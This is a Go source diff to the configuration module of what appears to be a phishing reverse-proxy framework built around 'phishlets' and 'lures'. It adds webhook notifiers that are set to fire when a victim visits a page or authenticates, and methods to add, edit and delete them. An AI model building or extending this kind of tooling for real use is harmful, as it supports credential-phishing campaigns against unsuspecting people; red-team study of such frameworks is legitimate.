@@ -25,6 +25,18 @@ type Lure struct {
 	OgUrl           string `mapstructure:"og_url" yaml:"og_url"`
 }
 
+type Notify struct {
+	Enabled           bool   `mapstructure:"enabled" yaml:"enabled"`
+	OnEvent           string `mapstructure:"on_event" yaml:"on_event"`
+	Url               string `mapstructure:"url" yaml:"url"`
+	Method            string `mapstructure:"method" yaml:"method"`
+	AuthHeaderName    string `mapstructure:"auth_header_name" yaml:"auth_header_name"`
+	AuthHeaderValue   string `mapstructure:"auth_header_value" yaml:"auth_header_value"`
+	BasicAuthUser     string `mapstructure:"basic_auth_user" yaml:"basic_auth_user"`
+	BasicAuthPassword string `mapstructure:"basic_auth_password" yaml:"basic_auth_password"`
+	ForwardParam      string `mapstructure:"forward_param" yaml:"forward_param"`
+}
+
 type Config struct {
 	siteDomains       map[string]string
 	baseDomain        string
@@ -47,6 +59,7 @@ type Config struct {
 	redirectUrl       string
 	templatesDir      string
 	lures             []*Lure
+	notifiers         []*Notify
 	cfg               *viper.Viper
 }
 
@@ -67,6 +80,7 @@ const (
 	CFG_PROXY_USERNAME     = "proxy_username"
 	CFG_PROXY_PASSWORD     = "proxy_password"
 	CFG_PROXY_ENABLED      = "proxy_enabled"
+	CFG_NOTIFIERS          = "notifiers"
 	CFG_BLACKLIST_MODE     = "blacklist_mode"
 )
 
@@ -80,6 +94,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		phishlets:     make(map[string]*Phishlet),
 		phishletNames: []string{},
 		lures:         []*Lure{},
+		notifiers:     []*Notify{},
 	}
 
 	c.cfg = viper.New()
@@ -157,6 +172,8 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.lures = []*Lure{}
 	c.cfg.UnmarshalKey(CFG_LURES, &c.lures)
 
+	c.notifiers = []*Notify{}
+	c.cfg.UnmarshalKey(CFG_NOTIFIERS, &c.notifiers)
 	return c, nil
 }
 
@@ -435,6 +452,70 @@ func (c *Config) IsActiveHostname(host string) bool {
 func (c *Config) AddPhishlet(site string, pl *Phishlet) {
 	c.phishletNames = append(c.phishletNames, site)
 	c.phishlets[site] = pl
+}
+
+func (c *Config) IsValidNotifierOnEvent(on_event string) bool {
+	switch on_event {
+	case
+		"authenticated",
+		"visitor",
+		"unauthorized":
+		return true
+	}
+	return false
+}
+
+func (c *Config) IsValidNotifierMethod(on_event string) bool {
+	switch on_event {
+	case
+		"GET",
+		"POST":
+		return true
+	}
+	return false
+}
+
+func (c *Config) AddNotifier(site string, n *Notify) {
+	c.notifiers = append(c.notifiers, n)
+	c.cfg.Set(CFG_NOTIFIERS, c.notifiers)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) GetNotifier(index int) (*Notify, error) {
+	if index >= 0 && index < len(c.notifiers) {
+		return c.notifiers[index], nil
+	} else {
+		return nil, fmt.Errorf("index out of bounds: %d", index)
+	}
+}
+
+func (c *Config) SetNotifier(index int, n *Notify) error {
+	if index >= 0 && index < len(c.notifiers) {
+		c.notifiers[index] = n
+	} else {
+		return fmt.Errorf("index out of bounds: %d", index)
+	}
+	c.cfg.Set(CFG_NOTIFIERS, c.notifiers)
+	c.cfg.WriteConfig()
+	return nil
+}
+
+func (c *Config) DeleteNotifier(index []int) []int {
+	tnotifier := []*Notify{}
+	di := []int{}
+	for n, N := range c.notifiers {
+		if !intExists(n, index) {
+			tnotifier = append(tnotifier, N)
+		} else {
+			di = append(di, n)
+		}
+	}
+	if len(di) > 0 {
+		c.notifiers = tnotifier
+		c.cfg.Set(CFG_NOTIFIERS, c.notifiers)
+		c.cfg.WriteConfig()
+	}
+	return di
 }
 
 func (c *Config) AddLure(site string, l *Lure) {
